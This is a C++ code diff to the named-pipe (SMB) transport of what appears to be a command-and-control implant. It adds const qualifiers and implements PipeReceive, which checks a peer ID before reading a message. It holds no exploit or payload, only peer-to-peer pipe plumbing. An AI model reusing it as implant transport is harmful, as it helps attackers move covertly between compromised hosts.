@@ -331,14 +331,14 @@ namespace Smb {
         }
     }
 
-    BOOL PipeRead(HANDLE handle, _stream *in) {
+    BOOL PipeRead(const HANDLE handle, const _stream *in) {
         HEXANE
 
         uint32_t read = 0;
         uint32_t total = 0;
 
         do {
-            auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
+            const auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
 
             if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
@@ -352,14 +352,14 @@ namespace Smb {
         return true;
     }
 
-    BOOL PipeWrite(HANDLE handle, _stream *out) {
+    BOOL PipeWrite(const HANDLE handle, const _stream *out) {
         HEXANE
 
         uint32_t total = 0;
         uint32_t write = 0;
 
         do {
-            auto length = MIN((out->length - total), PIPE_BUFFER_MAX);
+            const auto length = MIN((out->length - total), PIPE_BUFFER_MAX);
 
             if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, R_CAST(LPDWORD, &write), nullptr)) {
                 return false;
@@ -407,8 +407,40 @@ namespace Smb {
         return success;
     }
 
-    VOID PipeReceive(_stream **in) {
+    BOOL PipeReceive(_stream **in) {
         HEXANE
 
+        uint32_t total      = 0;
+        uint32_t peer_id    = 0;
+        uint32_t msg_size   = 0;
+        bool success        = true;
+
+        if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
+            if (total > sizeof(uint32_t) * 2) {
+
+                if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), R_CAST(LPDWORD, &total), nullptr)) {
+                    success_(false);
+                }
+                if (Ctx->session.peer_id != peer_id) {
+                    success_(false);
+                }
+                if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), R_CAST(LPDWORD, &total), nullptr)) {
+                    if (ntstatus != ERROR_MORE_DATA) {
+                        success_(false);
+                    }
+                }
+
+                if (
+                    !(*in = Stream::CreateStream()) || !PipeRead(Ctx->transport.pipe_handle, *in)) {
+                    if (*in) {
+                        Stream::DestroyStream(*in);
+                    }
+                    success_(false);
+                }
+            }
+        }
+
+    defer:
+        return success;
     }
 }
